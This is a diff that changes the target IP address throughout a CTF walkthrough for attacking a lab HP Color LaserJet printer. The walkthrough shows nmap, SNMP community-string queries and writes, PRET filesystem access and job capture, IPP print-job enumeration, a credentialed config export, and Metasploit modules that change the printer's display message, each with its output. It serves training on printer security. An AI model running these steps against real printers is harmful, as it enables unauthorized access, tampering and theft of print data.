@@ -149,8 +149,8 @@ Search for and modify these settings:
 **Alternative Command-Line Approach**:
 ```bash
 # For command-line testing without browser
-curl -k --tlsv1.0 https://192.168.1.131
-wget --no-check-certificate --secure-protocol=TLSv1 https://192.168.1.131
+curl -k --tlsv1.0 https://192.168.148.105
+wget --no-check-certificate --secure-protocol=TLSv1 https://192.168.148.105
 ```
 
 ### Step 5: Create Working Directory Structure
@@ -188,16 +188,16 @@ cd ~/printer_ctf
 ```bash
 # First, confirm the target is reachable
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ ping -c 2 192.168.1.131
+└─$ ping -c 2 192.168.148.105
 ```
 
 **Expected Output**:
 ```
-PING 192.168.1.131 (192.168.1.131) 56(84) bytes of data.
-64 bytes from 192.168.1.131: icmp_seq=1 ttl=64 time=0.521 ms
-64 bytes from 192.168.1.131: icmp_seq=2 ttl=64 time=0.456 ms
+PING 192.168.148.105 (192.168.148.105) 56(84) bytes of data.
+64 bytes from 192.168.148.105: icmp_seq=1 ttl=64 time=0.521 ms
+64 bytes from 192.168.148.105: icmp_seq=2 ttl=64 time=0.456 ms
 
---- 192.168.1.131 ping statistics ---
+--- 192.168.148.105 ping statistics ---
 2 packets transmitted, 2 received, 0% packet loss, time 1001ms
 ```
 
@@ -208,7 +208,7 @@ PING 192.168.1.131 (192.168.1.131) 56(84) bytes of data.
 ```bash
 # Full TCP and UDP scan for printer services
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ sudo nmap -sS -sU -sV -sC -p- -T4 192.168.1.131 -oA recon/printer_fullscan
+└─$ sudo nmap -sS -sU -sV -sC -p- -T4 192.168.148.105 -oA recon/printer_fullscan
 ```
 
 **Command Breakdown**:
@@ -223,7 +223,7 @@ PING 192.168.1.131 (192.168.1.131) 56(84) bytes of data.
 **Expected Output**:
 ```
 Starting Nmap 7.94 ( https://nmap.org )
-Nmap scan report for 192.168.1.131
+Nmap scan report for 192.168.148.105
 Host is up (0.00052s latency).
 
 PORT     STATE SERVICE     VERSION
@@ -262,13 +262,13 @@ OS details: HP Color LaserJet Pro MFP 4301fdw
 ```bash
 # Check HTTP headers
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ curl -I http://192.168.1.131
+└─$ curl -I http://192.168.148.105
 ```
 
 **Output**:
 ```
 HTTP/1.1 301 Moved Permanently
-Location: https://192.168.1.131/
+Location: https://192.168.148.105/
 Server: HP HTTP Server 2.0
 Content-Length: 0
 ```
@@ -278,7 +278,7 @@ Content-Length: 0
 ```bash
 # HTTPS connection test
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ curl -k -I https://192.168.1.131
+└─$ curl -k -I https://192.168.148.105
 ```
 
 **Output**:
@@ -303,7 +303,7 @@ X-Content-Type-Options: nosniff
 ```bash
 # Test raw connection to JetDirect port
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ nc -v 192.168.1.131 9100
+└─$ nc -v 192.168.148.105 9100
 ```
 
 **Expected Behavior**: Connection succeeds but no banner is displayed. The port accepts raw print data.
@@ -313,7 +313,7 @@ X-Content-Type-Options: nosniff
 ```bash
 # Test default community string
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.1.0
+└─$ snmpget -v2c -c public 192.168.148.105 1.3.6.1.2.1.1.1.0
 ```
 
 **Expected Output** (if SNMP is exposed):
@@ -355,7 +355,7 @@ PRET supports three printing languages. We'll test all three to see which provid
 ```bash
 # Connect using PostScript protocol
 ┌──(kali@kali)-[/opt/PRET]
-└─$ python3 pret.py 192.168.1.131 ps
+└─$ python3 pret.py 192.168.148.105 ps
 ```
 
 **Expected Output**:
@@ -386,7 +386,7 @@ Trying port 9100/tcp...
    
 
 Welcome to the pret shell. Type help or ? to list commands.
-192.168.1.131:/> 
+192.168.148.105:/> 
 ```
 
 **Success!** PostScript connection established.
@@ -395,7 +395,7 @@ Welcome to the pret shell. Type help or ? to list commands.
 
 ```bash
 # Inside PRET shell - Get device information
-192.168.1.131:/> info id
+192.168.148.105:/> info id
 ```
 
 **Output**:
@@ -408,7 +408,7 @@ Serial:      CNXXXXXXX
 
 ```bash
 # Get configuration information
-192.168.1.131:/> info config
+192.168.148.105:/> info config
 ```
 
 **Output**:
@@ -421,7 +421,7 @@ PostScript Level:  3
 
 ```bash
 # List available commands
-192.168.1.131:/> help
+192.168.148.105:/> help
 ```
 
 **Output**:
@@ -438,18 +438,18 @@ put     pwd     reset  restart set     site    status  timeout touch   unlock
 Exit PS shell and try PJL:
 
 ```bash
-192.168.1.131:/> exit
+192.168.148.105:/> exit
 
 # Connect using PJL protocol
 ┌──(kali@kali)-[/opt/PRET]
-└─$ python3 pret.py 192.168.1.131 pjl
+└─$ python3 pret.py 192.168.148.105 pjl
 ```
 
 **Output**:
 ```
-Connected to 192.168.1.131:9100 using PJL
+Connected to 192.168.148.105:9100 using PJL
 
-192.168.1.131:/> info id
+192.168.148.105:/> info id
 ```
 
 **PJL Output**:
@@ -462,7 +462,7 @@ Model: NPIAD6F2B
 
 ```bash
 # Get environment variables
-192.168.1.131:/> info variables
+192.168.148.105:/> info variables
 ```
 
 **Output**:
@@ -480,18 +480,18 @@ RESOLUTION=600
 #### Protocol 3: PCL (Printer Command Language)
 
 ```bash
-192.168.1.131:/> exit
+192.168.148.105:/> exit
 
 # Connect using PCL protocol
 ┌──(kali@kali)-[/opt/PRET]
-└─$ python3 pret.py 192.168.1.131 pcl
+└─$ python3 pret.py 192.168.148.105 pcl
 ```
 
 **Output**:
 ```
-Connected to 192.168.1.131:9100 using PCL
+Connected to 192.168.148.105:9100 using PCL
 
-192.168.1.131:/> info config
+192.168.148.105:/> info config
 ```
 
 **Analysis**: PCL provides limited information compared to PS and PJL. For this printer, **PJL provides the best access**.
@@ -502,14 +502,14 @@ Reconnect using PJL for maximum access:
 
 ```bash
 ┌──(kali@kali)-[/opt/PRET]
-└─$ python3 pret.py 192.168.1.131 pjl
+└─$ python3 pret.py 192.168.148.105 pjl
 ```
 
 #### Exploring the Printer's Filesystem
 
 ```bash
 # List root directory
-192.168.1.131:/> ls
+192.168.148.105:/> ls
 ```
 
 **Output**:
@@ -527,8 +527,8 @@ d-------- 0 webServer/
 
 ```bash
 # Navigate to saveDevice (persistent storage)
-192.168.1.131:/> cd saveDevice
-192.168.1.131:/saveDevice> ls
+192.168.148.105:/> cd saveDevice
+192.168.148.105:/saveDevice> ls
 ```
 
 **Output**:
@@ -540,8 +540,8 @@ total 2
 
 ```bash
 # Navigate to webServer
-192.168.1.131:/saveDevice> cd ../webServer
-192.168.1.131:/webServer> ls
+192.168.148.105:/saveDevice> cd ../webServer
+192.168.148.105:/webServer> ls
 ```
 
 **Output**:
@@ -558,7 +558,7 @@ d-------- 0 html/
 
 ```bash
 # Try to download configuration file
-192.168.1.131:/webServer> get config.xml
+192.168.148.105:/webServer> get config.xml
 ```
 
 **Possible Outcomes**:
@@ -585,7 +585,7 @@ Retrieving config.xml...
 
 ```bash
 # Get detailed status
-192.168.1.131:/webServer> info status
+192.168.148.105:/webServer> info status
 ```
 
 **Output**:
@@ -598,7 +598,7 @@ ONLINE=TRUE
 
 ```bash
 # Get filesystem information
-192.168.1.131:/webServer> info filesys
+192.168.148.105:/webServer> info filesys
 ```
 
 **Output**:
@@ -640,7 +640,7 @@ Volume 0:
 ```bash
 # Get system description
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.1.0
+└─$ snmpget -v2c -c public 192.168.148.105 1.3.6.1.2.1.1.1.0
 ```
 
 **Output**:
@@ -655,7 +655,7 @@ SNMPv2-MIB::sysDescr.0 = STRING: HP Color LaserJet Pro MFP 4301fdw, FW:002_2306A
 ```bash
 # Get system location (OID 1.3.6.1.2.1.1.6.0)
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0
+└─$ snmpget -v2c -c public 192.168.148.105 1.3.6.1.2.1.1.6.0
 ```
 
 **Output**:
@@ -681,7 +681,7 @@ echo "FLAG 1: FLAG{LUKE47239581} - Source: SNMP sysLocation.0" >> ~/printer_ctf/
 ```bash
 # Get system contact (OID 1.3.6.1.2.1.1.4.0)
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.4.0
+└─$ snmpget -v2c -c public 192.168.148.105 1.3.6.1.2.1.1.4.0
 ```
 
 **Output**:
@@ -709,7 +709,7 @@ echo "FLAG 2: FLAG{LEIA83920174} - Source: SNMP sysContact.0" >> ~/printer_ctf/l
 ```bash
 # Walk the entire system MIB tree
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.1 > recon/snmp_system.txt
+└─$ snmpwalk -v2c -c public 192.168.148.105 1.3.6.1.2.1.1 > recon/snmp_system.txt
 ```
 
 **Output** (saved to file):
@@ -728,7 +728,7 @@ SNMPv2-MIB::sysServices.0 = INTEGER: 72
 ```bash
 # Walk HP enterprise MIB (OID 1.3.6.1.4.1.11)
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.4.1.11 > recon/snmp_hp.txt
+└─$ snmpwalk -v2c -c public 192.168.148.105 1.3.6.1.4.1.11 > recon/snmp_hp.txt
 ```
 
 **Output** (partial - very large):
@@ -751,7 +751,7 @@ SNMPv2-SMI::enterprises.11.2.3.9.4.2.1.3.9.1.1.4.2 = INTEGER: 90
 ```bash
 # Get network interfaces
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.2.2.1.2
+└─$ snmpwalk -v2c -c public 192.168.148.105 1.3.6.1.2.1.2.2.1.2
 ```
 
 **Output**:
@@ -763,17 +763,17 @@ IF-MIB::ifDescr.2 = STRING: WiFi Interface
 ```bash
 # Get IP addressing
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.4.20.1
+└─$ snmpwalk -v2c -c public 192.168.148.105 1.3.6.1.2.1.4.20.1
 ```
 
 **Output**:
 ```
-IP-MIB::ipAdEntAddr.192.168.1.131 = IpAddress: 192.168.1.131
-IP-MIB::ipAdEntNetMask.192.168.1.131 = IpAddress: 255.255.255.0
+IP-MIB::ipAdEntAddr.192.168.148.105 = IpAddress: 192.168.148.105
+IP-MIB::ipAdEntNetMask.192.168.148.105 = IpAddress: 255.255.255.0
 ```
 
 **Network Intelligence Gathered**:
-- IP: 192.168.1.131
+- IP: 192.168.148.105
 - Subnet: 255.255.255.0 (/24)
 - Interface types: Ethernet + WiFi (dual-connected)
 
@@ -805,7 +805,7 @@ IP-MIB::ipAdEntNetMask.192.168.1.131 = IpAddress: 255.255.255.0
 ```bash
 # Test most common path first
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attributes.test
+└─$ ipptool -tv ipp://192.168.148.105:631/ipp/print get-printer-attributes.test
 ```
 
 **If this fails**, try other common paths:
@@ -813,18 +813,18 @@ IP-MIB::ipAdEntNetMask.192.168.1.131 = IpAddress: 255.255.255.0
 ```bash
 # Test alternative paths
 for path in /ipp/print /ipp/printer /ipp /printers ""; do
-    echo "Testing: ipp://192.168.1.131:631$path"
-    ipptool -t ipp://192.168.1.131:631$path get-printer-attributes.test 2>&1 | awk '/PASS/ {exit 0} END {exit NR==0}' && echo "SUCCESS: Use $path" && break
+    echo "Testing: ipp://192.168.148.105:631$path"
+    ipptool -t ipp://192.168.148.105:631$path get-printer-attributes.test 2>&1 | awk '/PASS/ {exit 0} END {exit NR==0}' && echo "SUCCESS: Use $path" && break
 done
 ```
 
 **Expected Output**:
 ```
-Testing: ipp://192.168.1.131:631/ipp/print
+Testing: ipp://192.168.148.105:631/ipp/print
 SUCCESS: Use /ipp/print
 ```
 
-**Result**: The correct IPP endpoint is `ipp://192.168.1.131:631/ipp/print`
+**Result**: The correct IPP endpoint is `ipp://192.168.148.105:631/ipp/print`
 
 ### Step 4.2: Creating IPP Test Files
 
@@ -862,7 +862,7 @@ EOF
 ```bash
 # Execute the IPP query
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attributes.test
+└─$ ipptool -tv ipp://192.168.148.105:631/ipp/print get-printer-attributes.test
 ```
 
 **Output** (partial - very long):
@@ -874,7 +874,7 @@ Get All Printer Attributes:
     
     attributes-charset (charset) = utf-8
     attributes-natural-language (naturalLanguage) = en
-    printer-uri-supported (uri) = ipp://192.168.1.131:631/ipp/print
+    printer-uri-supported (uri) = ipp://192.168.148.105:631/ipp/print
     printer-name (nameWithoutLanguage) = HP_Color_LaserJet_MFP_4301
     printer-location (nameWithoutLanguage) = Server-Room-B | Discovery Code: FLAG{LUKE47239581}
     printer-info (nameWithoutLanguage) = HP-MFP-CTF-FLAG{HAN62947103}
@@ -926,7 +926,7 @@ EOF
 **Run targeted query**:
 ```bash
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-specific-attributes.test
+└─$ ipptool -tv ipp://192.168.148.105:631/ipp/print get-specific-attributes.test
 ```
 
 **Output** (much cleaner):
@@ -961,7 +961,7 @@ Get Specific Attributes:
 ```bash
 # Access web interface
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ firefox https://192.168.1.131 &
+└─$ firefox https://192.168.148.105 &
 ```
 
 **Browser Display**:
@@ -1023,7 +1023,7 @@ Navigate through the web interface:
 ```bash
 # Access configuration export directly
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ curl -k -u Admin:68076694 https://192.168.1.131/hp/device/save_restore.xml -o recon/printer_config.xml
+└─$ curl -k -u Admin:68076694 https://192.168.148.105/hp/device/save_restore.xml -o recon/printer_config.xml
 ```
 
 **Successful Download**:
@@ -1049,11 +1049,11 @@ Navigate through the web interface:
     <Model>HP Color LaserJet Pro MFP 4301fdw</Model>
     <SerialNumber>CNXXXXXXX</SerialNumber>
     <FirmwareVersion>002_2306A</FirmwareVersion>
-    <NetworkAddress>192.168.1.131</NetworkAddress>
+    <NetworkAddress>192.168.148.105</NetworkAddress>
   </DeviceInformation>
   
   <NetworkConfiguration>
-    <IPv4Address>192.168.1.131</IPv4Address>
+    <IPv4Address>192.168.148.105</IPv4Address>
     <SubnetMask>255.255.255.0</SubnetMask>
     <DefaultGateway>192.168.1.1</DefaultGateway>
     <DNSServer>192.168.1.1</DNSServer>
@@ -1090,7 +1090,7 @@ Navigate to **Network > Configuration** in the web interface:
 Network Configuration
 
 IPv4 Configuration:
-  IP Address:      192.168.1.131
+  IP Address:      192.168.148.105
   Subnet Mask:     255.255.255.0
   Default Gateway: 192.168.1.1
   DNS Server:      192.168.1.1
@@ -1199,7 +1199,7 @@ EOF
 ```bash
 # Execute job enumeration
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-jobs.test
+└─$ ipptool -tv ipp://192.168.148.105:631/ipp/print get-jobs.test
 ```
 
 **Output**:
@@ -1210,7 +1210,7 @@ Get All Print Jobs:
     status-code = successful-ok (successful-ok)
     
     job-id (integer) = 1234
-    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1234
+    job-uri (uri) = ipp://192.168.148.105:631/ipp/print/1234
     job-name (nameWithoutLanguage) = Confidential-Security-Report
     job-originating-user-name (nameWithoutLanguage) = admin
     job-state (enum) = completed
@@ -1220,20 +1220,20 @@ Get All Print Jobs:
     number-of-documents (integer) = 1
     
     job-id (integer) = 1235
-    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1235
+    job-uri (uri) = ipp://192.168.148.105:631/ipp/print/1235
     job-name (nameWithoutLanguage) = PostScript-Challenge
     job-originating-user-name (nameWithoutLanguage) = security-audit
     job-state (enum) = completed
     
     job-id (integer) = 1236
-    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1236
+    job-uri (uri) = ipp://192.168.148.105:631/ipp/print/1236
     job-name (nameWithoutLanguage) = Network-Config-Backup
     job-originating-user-name (nameWithoutLanguage) = FLAG{PADME91562837}
     job-state (enum) = completed
     time-at-creation (integer) = 1699896550
     
     job-id (integer) = 1237
-    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1237
+    job-uri (uri) = ipp://192.168.148.105:631/ipp/print/1237
     job-name (nameWithoutLanguage) = CTF-Challenge-Job-FLAG{MACE41927365}
     job-originating-user-name (nameWithoutLanguage) = security-audit
     job-state (enum) = held
@@ -1286,7 +1286,7 @@ EOF
 **Execute query**:
 ```bash
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ ipptool -tv ipp://192.168.1.131:631/ipp/print get-job-1237.test
+└─$ ipptool -tv ipp://192.168.148.105:631/ipp/print get-job-1237.test
 ```
 
 **Detailed Output**:
@@ -1295,7 +1295,7 @@ Get Job 1237 Details:
     PASS
     
     job-id (integer) = 1237
-    job-uri (uri) = ipp://192.168.1.131:631/ipp/print/1237
+    job-uri (uri) = ipp://192.168.148.105:631/ipp/print/1237
     job-uuid (uri) = urn:uuid:12345678-1234-5678-1234-567812345678
     job-name (nameWithoutLanguage) = CTF-Challenge-Job-FLAG{MACE41927365}
     job-originating-user-name (nameWithoutLanguage) = security-audit
@@ -1506,10 +1506,10 @@ While we found flags via IPP, PRET can also capture print jobs using PostScript:
 ```bash
 # Connect via PostScript protocol
 ┌──(kali@kali)-[/opt/PRET]
-└─$ python3 pret.py 192.168.1.131 ps
+└─$ python3 pret.py 192.168.148.105 ps
 
 # Enable job capture
-192.168.1.131:/> capture
+192.168.148.105:/> capture
 ```
 
 **Output**:
@@ -1529,7 +1529,7 @@ If the "private" community string is active with write access:
 ```bash
 # Test write access
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ snmpset -v2c -c private 192.168.1.131 1.3.6.1.2.1.1.6.0 s "Modified Location"
+└─$ snmpset -v2c -c private 192.168.148.105 1.3.6.1.2.1.1.6.0 s "Modified Location"
 ```
 
 **If Successful**:
@@ -1559,7 +1559,7 @@ EOF
 
 # Send to printer
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ nc 192.168.1.131 9100 < pjl_list.txt
+└─$ nc 192.168.148.105 9100 < pjl_list.txt
 ```
 
 **Expected Output**:
@@ -1598,14 +1598,14 @@ Matching Modules
 ```ruby
 # Use SNMP printer enumeration
 msf6 > use auxiliary/scanner/snmp/printer_enum
-msf6 auxiliary(scanner/snmp/printer_enum) > set RHOSTS 192.168.1.131
+msf6 auxiliary(scanner/snmp/printer_enum) > set RHOSTS 192.168.148.105
 msf6 auxiliary(scanner/snmp/printer_enum) > set COMMUNITY public
 msf6 auxiliary(scanner/snmp/printer_enum) > run
 ```
 
 **Output**:
 ```
-[+] 192.168.1.131:161 - 
+[+] 192.168.148.105:161 - 
 [*] System information:
 [*]   Hostname: HP-MFP-4301
 [*]   Description: HP Color LaserJet Pro MFP 4301fdw
@@ -1624,7 +1624,7 @@ Some printer information pages are accessible without authentication:
 ```bash
 # Test unauthenticated pages
 ┌──(kali@kali)-[~/printer_ctf]
-└─$ curl -k https://192.168.1.131/DevMgmt/ProductConfigDyn.xml
+└─$ curl -k https://192.168.148.105/DevMgmt/ProductConfigDyn.xml
 ```
 
 **Possible Output**:
@@ -1657,21 +1657,21 @@ Metasploit provides several modules specifically designed for printer enumeratio
 
 ```ruby
 msf6 > use auxiliary/scanner/snmp/snmp_enum
-msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.1.131
+msf6 auxiliary(scanner/snmp/snmp_enum) > set RHOSTS 192.168.148.105
 msf6 auxiliary(scanner/snmp/snmp_enum) > set COMMUNITY public
 msf6 auxiliary(scanner/snmp/snmp_enum) > run
 ```
 
 **Output**:
 ```
-[+] 192.168.1.131:161 - System information:
-[+]   Host IP: 192.168.1.131
+[+] 192.168.148.105:161 - System information:
+[+]   Host IP: 192.168.148.105
 [+]   Hostname: HP-MFP-4301
 [+]   Description: HP Color LaserJet Pro MFP 4301fdw, FW:002_2306A, SN:CNXXXXXXX
 [+]   Contact: SecTeam@lab.local | FLAG{LEIA83920174}
 [+]   Location: Server-Room-B | Discovery Code: FLAG{LUKE47239581}
 [+]   Uptime: (312456) 3 days, 14:47:36
-[+] 192.168.1.131:161 - Network information:
+[+] 192.168.148.105:161 - Network information:
 [+]   IP forwarding enabled: no
 [+]   Default TTL: 64
 [+]   TCP segments received: 123456
@@ -1682,14 +1682,14 @@ msf6 auxiliary(scanner/snmp/snmp_enum) > run
 
 ```ruby
 msf6 > use auxiliary/scanner/printer/printer_list_dir
-msf6 auxiliary(scanner/printer/printer_list_dir) > set RHOSTS 192.168.1.131
+msf6 auxiliary(scanner/printer/printer_list_dir) > set RHOSTS 192.168.148.105
 msf6 auxiliary(scanner/printer/printer_list_dir) > set PROTOCOL PJL
 msf6 auxiliary(scanner/printer/printer_list_dir) > run
 ```
 
 **Output**:
 ```
-[*] Connecting to 192.168.1.131:9100
+[*] Connecting to 192.168.148.105:9100
 [+] Found 3 directories:
 [*]   PJL/
 [*]   saveDevice/
@@ -1701,13 +1701,13 @@ msf6 auxiliary(scanner/printer/printer_list_dir) > run
 
 ```ruby
 msf6 > use auxiliary/scanner/printer/printer_env_vars
-msf6 auxiliary(scanner/printer/printer_env_vars) > set RHOSTS 192.168.1.131
+msf6 auxiliary(scanner/printer/printer_env_vars) > set RHOSTS 192.168.148.105
 msf6 auxiliary(scanner/printer/printer_env_vars) > run
 ```
 
 **Output**:
 ```
-[*] Connecting to 192.168.1.131:9100
+[*] Connecting to 192.168.148.105:9100
 [+] PJL Environment Variables:
 [*]   BINDING=OFF
 [*]   COPIES=1
@@ -1722,14 +1722,14 @@ msf6 auxiliary(scanner/printer/printer_env_vars) > run
 
 ```ruby
 msf6 > use auxiliary/scanner/printer/printer_ready_message
-msf6 auxiliary(scanner/printer/printer_ready_message) > set RHOSTS 192.168.1.131
+msf6 auxiliary(scanner/printer/printer_ready_message) > set RHOSTS 192.168.148.105
 msf6 auxiliary(scanner/printer/printer_ready_message) > set MESSAGE "PRINTER COMPROMISED"
 msf6 auxiliary(scanner/printer/printer_ready_message) > run
 ```
 
 **Output**:
 ```
-[*] Connecting to 192.168.1.131:9100
+[*] Connecting to 192.168.148.105:9100
 [+] Ready message changed to: PRINTER COMPROMISED
 [*] Note: This message will display on printer's control panel
 [*] Auxiliary module execution completed
@@ -1744,45 +1744,45 @@ msf6 auxiliary(scanner/printer/printer_ready_message) > run
 ### SNMP Commands
 ```bash
 # Basic enumeration
-snmpwalk -v2c -c public 192.168.1.131
+snmpwalk -v2c -c public 192.168.148.105
 
 # Specific OID query
-snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0
+snmpget -v2c -c public 192.168.148.105 1.3.6.1.2.1.1.6.0
 
 # System information
-snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.2.1.1
+snmpwalk -v2c -c public 192.168.148.105 1.3.6.1.2.1.1
 
 # Printer MIB
-snmpwalk -v2c -c public 192.168.1.131 1.3.6.1.4.1.11
+snmpwalk -v2c -c public 192.168.148.105 1.3.6.1.4.1.11
 ```
 
 ### IPP Commands
 ```bash
 # Get printer attributes
-ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attributes.test
+ipptool -tv ipp://192.168.148.105:631/ipp/print get-printer-attributes.test
 
 # Get all jobs
-ipptool -tv ipp://192.168.1.131:631/ipp/print get-jobs.test
+ipptool -tv ipp://192.168.148.105:631/ipp/print get-jobs.test
 
 # Get specific job
-ipptool -tv ipp://192.168.1.131:631/ipp/print get-job-1237.test
+ipptool -tv ipp://192.168.148.105:631/ipp/print get-job-1237.test
 
 # Test endpoint
 for path in /ipp/print /ipp /printers; do
-    ipptool -t ipp://192.168.1.131:631$path get-printer-attributes.test
+    ipptool -t ipp://192.168.148.105:631$path get-printer-attributes.test
 done
 ```
 
 ### PRET Commands
 ```bash
 # PostScript mode
-python3 pret.py 192.168.1.131 ps
+python3 pret.py 192.168.148.105 ps
 
 # PJL mode
-python3 pret.py 192.168.1.131 pjl
+python3 pret.py 192.168.148.105 pjl
 
 # PCL mode
-python3 pret.py 192.168.1.131 pcl
+python3 pret.py 192.168.148.105 pcl
 
 # Inside PRET shell
 info config
@@ -1795,25 +1795,25 @@ cd 0:/saveDevice
 ### Web Interface
 ```bash
 # HTTP to HTTPS redirect test
-curl -I http://192.168.1.131
+curl -I http://192.168.148.105
 
 # Configuration export (requires credentials from AXIS camera)
-curl -k -u Admin:68076694 https://192.168.1.131/hp/device/save_restore.xml -o config.xml
+curl -k -u Admin:68076694 https://192.168.148.105/hp/device/save_restore.xml -o config.xml
 
 # Device information
-firefox https://192.168.1.131/hp/device/DeviceInformation/View
+firefox https://192.168.148.105/hp/device/DeviceInformation/View
 ```
 
 ### Network Scanning
 ```bash
 # Full port scan
-nmap -sS -sU -sV -sC -p- -T4 192.168.1.131 -oA printer_scan
+nmap -sS -sU -sV -sC -p- -T4 192.168.148.105 -oA printer_scan
 
 # Service enumeration
-nmap -p 80,443,631,9100,161 -sV 192.168.1.131
+nmap -p 80,443,631,9100,161 -sV 192.168.148.105
 
 # Printer-specific NSE scripts
-nmap --script printer-info 192.168.1.131
+nmap --script printer-info 192.168.148.105
 ```
 
 ---
@@ -1886,13 +1886,13 @@ nmap --script printer-info 192.168.1.131
 
 **Symptoms**:
 ```
-Connection to 192.168.1.131 9100 port failed
+Connection to 192.168.148.105 9100 port failed
 ```
 
 **Diagnosis**:
 ```bash
-nc -zv 192.168.1.131 9100
-nmap -p 9100 192.168.1.131
+nc -zv 192.168.148.105 9100
+nmap -p 9100 192.168.148.105
 ```
 
 **Solutions**:
@@ -1905,13 +1905,13 @@ nmap -p 9100 192.168.1.131
 
 **Symptoms**:
 ```
-Timeout: No Response from 192.168.1.131
+Timeout: No Response from 192.168.148.105
 ```
 
 **Diagnosis**:
 ```bash
-nmap -sU -p 161 192.168.1.131
-snmpget -v1 -c public 192.168.1.131 1.3.6.1.2.1.1.1.0
+nmap -sU -p 161 192.168.148.105
+snmpget -v1 -c public 192.168.148.105 1.3.6.1.2.1.1.1.0
 ```
 
 **Solutions**:
@@ -1924,13 +1924,13 @@ snmpget -v1 -c public 192.168.1.131 1.3.6.1.2.1.1.1.0
 
 **Symptoms**:
 ```
-ipptool: Unable to connect to "ipp://192.168.1.131:631/ipp/print"
+ipptool: Unable to connect to "ipp://192.168.148.105:631/ipp/print"
 ```
 
 **Diagnosis**:
 ```bash
-nc -zv 192.168.1.131 631
-curl http://192.168.1.131:631/ipp/print
+nc -zv 192.168.148.105 631
+curl http://192.168.148.105:631/ipp/print
 ```
 
 **Solutions**:
@@ -1949,7 +1949,7 @@ SSL certificate problem: self signed certificate
 **Solutions**:
 ```bash
 # Use -k flag with curl
-curl -k https://192.168.1.131
+curl -k https://192.168.148.105
 
 # Configure Firefox about:config settings
 security.tls.version.enable-deprecated = true
@@ -1963,11 +1963,11 @@ security.tls.version.min = 1
 **Diagnosis**:
 ```bash
 # Verify printer IP is correct
-ping 192.168.1.131
+ping 192.168.148.105
 
 # Check if fields are populated
-snmpget -v2c -c public 192.168.1.131 1.3.6.1.2.1.1.6.0
-ipptool -tv ipp://192.168.1.131:631/ipp/print get-printer-attributes.test | awk 'tolower($0) ~ /location|contact|info/ {print}'
+snmpget -v2c -c public 192.168.148.105 1.3.6.1.2.1.1.6.0
+ipptool -tv ipp://192.168.148.105:631/ipp/print get-printer-attributes.test | awk 'tolower($0) ~ /location|contact|info/ {print}'
 ```
 
 **Solutions**:
